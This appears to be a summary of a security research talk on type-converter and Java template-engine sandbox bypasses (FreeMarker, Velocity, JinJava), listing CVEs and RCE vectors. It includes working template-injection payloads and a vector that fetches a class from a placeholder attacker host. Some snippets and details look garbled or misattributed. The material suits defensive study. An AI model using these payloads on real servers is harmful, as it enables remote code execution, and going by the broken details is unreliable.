# Type Converters and Custom Converters

### Overview
- **TypeConverters**: Tools for converting data types.
- **Custom converters**: Customized tools for specific conversion needs.

### Where to Search
- Anywhere text or binary data is converted into an object.
- When the type or class of the resulting object is under our control.

**Reference:**
- [Black Hat USA 2017 - Friday The 13th JSON Attacks](https://www.blackhat.com/docs/us-17/thursday/us-17-Munoz-Friday-The-13th-JSON-Attacks-wp.pdf)

## Security Problems During Conversion

### CVE-2020-1460
- **Affected Products**: Several Microsoft products.
- **Status**: Microsoft has not released fixes for all affected products.
- **Details**: Will be published once the problem is resolved in all products.
- **Result**: Arbitrary code execution.

## Time-of-Check to Time-of-Use (TOCTOU) Problems

### CVE-2020-1444: TOCTOU in WebPartEditingSurface.aspx Page

#### Details
- **Validation**: Input validated by `EditingPageParser.VerifyControlOnSafeList()`.
- **Modification**: After validation, certain substrings can be removed:
  ```csharp
  internal static Regex tagPrefixRegex = new Regex("", 9);
  private static XElement ConvertMarkupToTree(string webPartMarkup)
  {
      MatchCollection matchCollection = WebPartEditingSurfacePage.tagPrefixRegex.Matches(webPartMarkup);
      foreach (Match match in matchCollection)
      {
          webPartMarkup = webPartMarkup.Replace(match.Value, "");
      }
  }
  ```

#### Exploitation
- **Payload**: 
  - Comment block for `EditingPageParser.VerifyControlOnSafeList()`.
  - Two comments and ASPX markup for `TemplateControl.ParseControl(content)`.

- **Result**: Arbitrary code execution.

## Java Template Engines

### Common Java Template Engines
- Pebble
- JinJava
- Velocity
- FreeMarker
- Khoros
- Alfresco
- Crafter
- Liferay
- Ofbiz
- XWiki
- dotCMS
- Cascade
- Confluence
- HubSpot

### Example Usage
- **Template Engine**:
  ```java
  Hello $user.name!
  ```
  - **Output**: `Hello John!`
  - **Context**:
    - Key: `user`
    - Value: `acme.User`

### Context Objects
- **Common Context Objects**:
  - `request`
  - `response`
  - `application`
  - `session`
  - `ServletRequest`
  - `ServletResponse`
  - `ServletContext`
  - `HttpSession`

### Generic Sandbox Bypasses

#### Context Inspection
- **Access to Runtime**:
  - Debug
  - Instrumentation
- **Otherwise**:
  - Documentation and name guessing
  - List context objects

#### Indirect Objects
- **Example Methods**:
  - `javax.servlet.http.HttpSession.getAttributeNames()`
  - `javax.servlet.http.ServletRequest.getAttributeNames()`
  - `javax.servlet.ServletContext.getAttributeNames()`

### Object Dumpster Diving

#### Access Points
- `java.lang.Class.getClassLoader()`
- `java.lang.Thread.getCurrentClassLoader()`
- `java.lang.ProtectionDomain.getClassLoader()`
- `javax.servlet.ServletContext.getClassLoader()`
- `org.osgi.framework.wiring.BundleWiring.getClassLoader()`
- `org.springframework.context.ApplicationContext.getClassLoader()`

#### What Can Be Accessed
- Arbitrary class and classpath resources
- Local file disclosure through `java.net.URL` access

### Web Application ClassLoaders

#### Common ClassLoaders
- **Tomcat**: `org.apache.catalina.loader.WebappClassLoader`
- **Jetty**: `org.eclipse.jetty.webapp.WebAppClassLoader`
- **GlassFish**: `org.glassfish.web.loader.WebappClassLoader`
- **WildFly (JBoss)**: `org.jboss.modules.ModuleClassLoader`
- **WebSphere**: `com.ibm.ws.classloader.CompoundClassLoader`
- **WebLogic**: `weblogic.utils.classloaders.ChangeAwareClassLoader`

#### Remote Code Execution Vectors
- **WebShell Upload**: `getResources().write(...)`
- **Arbitrary Object Instantiation**:
  - Tomcat: `getResources().getContext().getInstanceManager()`
  - Jetty: `getContext().getObjectFactory()`
- **JNDI Lookup**: `getResources().lookup(...)`
- **Attacker-Controlled Static Class Initializer**:
  - FreeMarker & Pebble: `newInstance("http://attacker/pwn.jar").loadClass("Pwner").getField("PWN").get(null)`
  - WebSphere: `defineApplicationClass(...).getField(...).get(null)`

### InstanceManager / ObjectFactory

#### Locations
- `ServletContext` attributes on Tomcat, Jetty, WildFly (JBoss)
- `org.apache.catalina.InstanceManager`
- `org.wildfly.extension.undertow.deployment.UndertowJSPInstanceManager`
- `org.eclipse.jetty.util.DecoratedObjectFactory`
- WebApp ClassLoaders (Tomcat, Jetty)

#### What Can Be Done
- Arbitrary object instantiation leading to RCE.

### Spring Application Context

#### Locations
- `ServletContext` attribute: `org.springframework.web.context.WebApplicationContext.ROOT`
- Spring Macro Request Context (injected by Spring MVC)

#### Capabilities
- `getClassLoader()`
- `getEnvironment()`
- `getBean()`: Control application logic, disable sandboxes, instantiate arbitrary objects.

### Other Interesting Objects
- `com.fasterxml.jackson.databind.ObjectMapper`
- `org.springframework.web.context.support.ServletContextScope`
- `org.springframework.web.servlet.support.RequestContext`
- `org.apache.felix.framework.BundleContextImpl`
- `org.eclipse.osgi.internal.framework.BundleContextImpl`
- `com.liferay.portal.kernel.json.JSONFactoryUtil`
- `freemarker.ext.beans.BeansWrapper.getStaticModels`
- `com.opensymphony.xwork2.ognl.OgnlUtil`
- `com.opensymphony.xwork2.ognl.OgnlValueStack`
- `com.opensymphony.xwork.DefaultActionInvocation`
- `com.opensymphony.webwork.util.VelocityWebWorkUtil`
- `com.thoughtworks.xstream.XStream`
- `org.apache.camel.CamelContext`

### Specific Sandbox Bypasses

#### Previous Research
- **James Kettle (PortSwigger) 2015**:
  - `?new()` built-in (default configuration)
  - [Server-Side Template Injection](https://portswigger.net/research/server-side-template-injection)
- **Toni Torralba (Ackcent) 2019**:
  - Arbitrary object instantiation
  - [In-Depth FreeMarker Template Injection](https://ackcent.com/blog/in-depth-freemarker-template-injection/)
- **Ryan Hanson (Atredis Partners) March 2020**:
  - RCE via File Write on Tomcat server
  - [ATREDIS-2019-0006.md](https://github.com/atredispartners/advisories/blob/master/ATREDIS-2019-0006.md)

#### FreeMarker Sandbox
- **Bypass Method**:
  ```java
  ${"freemarker.template.utility.Execute"?new()("id")}
  ```
- **Sandbox Based on Blocklist**:
  - Blocked: `java.lang.Class.getClassLoader`
  - Allowed: `loadClass()`, `getResource()`
  - Reflective access to public fields allowed for reading but not setting.

#### RCE on FreeMarker + URLClassLoader
- **Exploit**:
  ```java
  pwn.jar
  public class Pwn {
      static {  }
      public static String PWN = "FOO";
  }
  ```

#### CodeQL Gadget Query
- Find public static fields that can instantiate arbitrary types.

#### Fixed in FreeMarker 2.30
- New sandbox based on `MemberAccessPolicy`.
- Default policy improves the blocklist and forbids access to `ClassLoader` methods and public fields through reflection.

#### If Spring Beans Are Accessible
- Disable the sandbox:
  ```java
  ${"freemarker.template.utility.Execute"?new()("id")}
  ```

### Velocity Sandbox
- **Blocklist**:
  - `introspector.restrict.packages = java.lang.reflect`
  - `introspector.restrict.classes = java.lang.Class, java.lang.ClassLoader, ...`
- **Fixed in Version 2.3**:
  - Blocklist checks are performed on the current object class rather than inspecting the class hierarchy.

### JinJava Sandbox
- **Method-based blocklist**:
  - Forbids any methods returning `java.lang.Class`.
  - Allows methods returning `java.lang.Class` arrays or maps.
- **Bypass**:
  ```java
  {% set ctx = ____int3rpr3t3r____.getContext() %}
  {% set a_class = ctx.getAllFunctions().toArray()[0].getMethod().getParameterTypes()[0] %}
  {% set cl = a_class.getProtectionDomain().getClassLoader() %}
  ```
- **Fixed in 2.5.4 (CVE-2020-12668)**

### Pebble Sandbox
- **Conclusions**:
  - CMS should be on Red Teams' radars.
  - Templates for dynamic content can be a direct path to RCE for attackers.
  - Perform security reviews and reduce the attack surface as much as possible.

### Results
- **Vulnerabilities Discovered**: Over 30 new vulnerabilities.
- **Affected Products**: Over 20 products.
- **CVEs**: CVE-2020-0971, CVE-2020-0974, CVE-2020-1069, CVE-2020-1103, CVE-2020-1460, CVE-2020-1147, CVE-2020-1444, CVE-2020-1961, CVE-2020-4027, CVE-2020-5245, CVE-2020-9296, CVE-2020-9297, CVE-2020-9496, CVE-2020-10199, CVE-2020-10204, CVE-2020-11002, CVE-2020-11994, CVE-2020-12668, CVE-2020-12873, CVE-2020-13445, ...

### Takeaways
- **Thanks!**
- **@pwntester, @OlekMirosh**

**Note:** This document provides a comprehensive overview of various security issues related to type conversion, template engines, and sandbox bypasses. It includes references and examples to help understand and mitigate these vulnerabilities.